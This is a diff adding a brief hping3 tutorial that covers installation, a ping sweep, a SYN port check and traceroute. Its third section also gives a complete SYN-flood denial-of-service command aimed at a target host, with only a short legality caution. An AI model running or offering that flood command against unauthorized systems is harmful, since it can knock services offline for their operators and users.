@@ -1,0 +1,39 @@
+-----------------------------------------------
+**************  HPING3  ************************
+INTRODUCTION
+->A potent network tool called HPING3 is used for a variety of network-related tasks, such as analysing networks, port scanning, and checking connectivity. I'll give you a quick tutorial on using HPING3 in a Linux environment right here.
+------------
+INSTALLATION
+------------
+->The repositories of the majority of Linux distributions usually contain HPING3 installation files. Utilising your distribution's own package manager, you can install it. On Debian/Ubuntu, for instance, you can run apt:
+   " sudo apt-get install hping3 "
+------------
+SIMPLE USE
+------------
+1. Ping Sweep
+
+    Using HPING3 and the -1 option, you can ping a set of IP addresses in a basic sweep. Using a variety of IP addresses, this sends ICMP echo queries and waits for responses:
+      " sudo hping3 -1 -c 3 192.168.1.1-10 " 
+        -1: Use ICMP echo requests (ping).
+        -c 3: Send 3 packets to each host.
+        192.168.1.1-10: Specify the IP range you want to ping.
+
+2. Ping TCP
+
+    If you want to see if a certain port on a host is open, you can send TCP packets using HPING3. For instance, to see if a host's port 80 (HTTP) is open
+      " sudo hping3 -S -p 80 target_ip "
+        -S: Send a TCP SYN packet (usually used to initiate a TCP connection).
+        -p 80: Specify the target port.
+
+3. DoS attack using SYN flooding
+
+    Please make responsible use of this command. Denial-of-service (DoS) attacks like SYN flooding may be against the law if done without the right permission.
+      " sudo hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood target_ip "
+        -d 120: Set the data size to 120 bytes.
+        -S: Send TCP SYN packets.
+        -w 64: Set the TCP window size.
+        --flood: Flood mode to send packets as fast as possible.
+
+4. Traceroute
+    Additionally, HPING3 can be used to send ICMP echo queries in a traceroute-like manner to a host:
+      " sudo hping3 --traceroute target_ip "
